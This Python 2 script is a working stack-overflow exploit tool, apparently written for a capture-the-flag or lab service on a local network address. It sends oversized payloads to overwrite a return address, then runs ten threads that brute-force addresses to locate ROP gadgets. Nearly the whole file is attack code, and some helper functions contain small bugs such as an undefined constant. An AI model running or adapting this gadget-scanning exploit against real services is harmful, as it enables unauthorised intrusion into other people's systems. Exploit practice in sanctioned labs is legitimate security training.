#!/usr/bin/python
import sys
import socket
import telnetlib 
import os
import time
import threading
from struct import pack, unpack

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != OK:
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def find_buffer_length(sz):  
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  
  # Put your code here!
  addr = int(s.recvuntil("\n"), 16)

  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)

  s.recvuntil("bytes of data: ")
  s.sendall("A" * sz)

  s.recvuntil("Done!")
  s.close()


  if ret is False:
    return "CRASH"

  return "NOCRASH"


  
def find_signal_gadget(offset):  
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  
  # Put your code here!
  addr = int(s.recvuntil("\n"), 16) & 0xfffffffffffff000

  payload = "A" * 40
  payload += dq(addr + offset) * 1

  sz = len(payload)

  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)

  s.settimeout(4)
  s.recvuntil("bytes of data: ")
  s.sendall(payload + "\n")

  err, ret = recvuntil(s, "Done!")
  s.close()

  d_ret = list(ret)
  d_payload = list("Echo: " + payload)

  while len(d_ret) and d_ret[0] == d_payload[0]:
    d_ret.pop(0)
    d_payload.pop(0)

  ret = ''.join(d_ret)
  print ret

  if err == "OK":
    return False

  if err == "TIMEOUT":
    return (err, ret)

  if err == "CRASH" and len(ret) > 0:
    return (err, ret)

  return False

# //////////////////////////////////////////////////////////////////////
# //////////////////////////////////////////////////////////////////////
# //////////////////////////////////////////////////////////////////////


def find_gadget(offset):
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  
  # Put your code here!
  addr = int(s.recvuntil("\n"), 16) & 0xfffffffffffff000

  payload = "A" * 40

  #payload += dq(addr + offset)  # scanned pop rXX; ret
  #payload += dq(0x4141414141414141)
  #payload += dq(0x400cbc)  # print

  #payload += dq(addr + offset)  # scanned pop rXX; ret
  #payload += dq(0x400001)
  #payload += dq(0x400ccb + 7 + 1)  # puts

  payload += dq(addr + offset)

  sz = len(payload)

  s.recvuntil("Data size: ")
  s.sendall("%i\n" % sz)

  s.settimeout(2)
  s.recvuntil("bytes of data: ")
  s.sendall(payload + "\n")

  err, ret = recvuntil(s, "Done!")
  s.close()

  d_ret = list(ret)
  d_payload = list("Echo: " + payload)

  while len(d_ret) and d_ret[0] == d_payload[0]:
    d_ret.pop(0)
    d_payload.pop(0)

  ret = ''.join(d_ret).strip()

  if len(ret) > 0:
    return (err, ret)

  if err == "OK":
    return False

  if err == "TIMEOUT":
    return False

  if err == "DISCONNECTED":
    return False

  return False



HOST = '192.168.2.240'
PORT = 1337


#for i in range(4, 128):
#  ret = find_buffer_length(i)
#  print i, ret

buffer_sz = 40

it = iter(range(0xb00, 4 * 1024 * 1024))
lock = threading.Lock()

def get_next():
  with lock:
    v = next(it)
  return v



def scan_for_signal_gadget():
  while True:
    i = get_next()
    ret = find_gadget(i)
    sys.stdout.write('.')
    sys.stdout.flush()
    
    if ret is False:
      continue
    print hex(i), ret
    sys.stdout.flush()


for i in range(10):
  threading.Thread(target=scan_for_signal_gadget).start()




